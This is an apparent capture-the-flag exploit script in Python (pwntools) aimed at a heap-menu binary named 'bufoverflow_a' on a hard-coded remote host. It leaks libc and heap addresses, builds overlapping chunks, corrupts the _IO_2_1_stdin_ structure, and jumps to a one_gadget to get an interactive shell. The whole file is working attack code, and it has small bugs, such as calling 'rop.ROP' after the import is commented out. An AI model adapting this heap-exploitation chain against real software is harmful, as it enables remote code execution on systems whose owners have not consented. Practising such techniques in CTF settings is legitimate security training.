from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./bufoverflow_a"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x0000000000001296+0x555555554000\n b *0x00000000000011DE+0x555555554000\n b *0xcdb+0x555555554000')


def sla(a,b):
	p.sendlineafter(a,b)

def sl(a):
	p.sendline(a)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def Alloc(size):
	sla('>> ','1')
	sla('Size: ',str(size))

def Delete(idx):
	sla('>> ','2')
	sla('Index: ',str(idx))

def Fill(content):
	sla('>> ','3')
	sla('Content: ',content)

def Show():
	sla('>> ','4')

def hack():
	raw_input()
	


	#step 1: leak libc information
	Alloc(0x100)	#0
	Alloc(0x80)		#1
	Delete(0)
	Alloc(0x100)	#0
	Show()
	top_addr = u64(rv(6).ljust(8,'\x00'))
	lg("top_addr",top_addr)
	libc.address = top_addr - 0x58 - 0x399B00
	lg("libc.address",libc.address)
	system_addr = libc.symbols['system']
	lg('system_addr',system_addr)

	#step 2: leak heap address
	Delete(1)
	Delete(0)

	Alloc(0x100)	#0
	Alloc(0x100)	#1
	Alloc(0x200)	#2
	Alloc(0x100)	#3

	Delete(0)
	Delete(2)
	Delete(3)

	Alloc(0x200)	#0
	Show()
	heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
	lg('heap_addr',heap_addr)

	Delete(0)
	Delete(1)

	#step 3: build overlap chunk
	Alloc(0x88)			#0
	Alloc(0x400)		#1
	Alloc(0x100)		#2
	Alloc(0x88)			#3

	Delete(0)
	Delete(1)

	Alloc(0x88)			#0
	Fill('a'*0x88)

	Alloc(0x88)			#1
	Alloc(0x88)			#4
	Alloc(0x200)		#5
	Alloc(0xc8)			#6

	Delete(1)
	Delete(2)
	Delete(5)

	stdin = libc.symbols['_IO_2_1_stdin_']
	lg('stdin',stdin)
	Alloc(0x518)
	payload = 'a'*0x80
	payload += p64(0) + p64(0x91)
	payload += 'b'*0x80
	payload += p64(0) + p64(0x211)
	payload += p64(0) + p64(stdin + 0x30)

	Fill(payload)

	Alloc(0x208)

	one_gadget = libc.address + 0xd6655
	payload = '\x00'*5
	payload += p64(libc.address + 0x39b770)
	payload += p64(0xffffffffffffffff) + p64(0)
	payload += p64(libc.address + 0x3999a0) + p64(0) 
	payload += p64(0) * 2
	payload += p64(0xffffffff) + p64(0) 
	payload += p64(0) + p64(libc.address + 0x396440)
	payload += '\x00'*0x130
	payload += p64(libc.address + 0x395f00) + p64(0)
	payload += p64(libc.address + 0x7c7b9) + p64(libc.address + 0x7c750)
	payload += p64(one_gadget)
	sla('>> ',payload)

	sla('Size: ','128')
	p.interactive()
hack()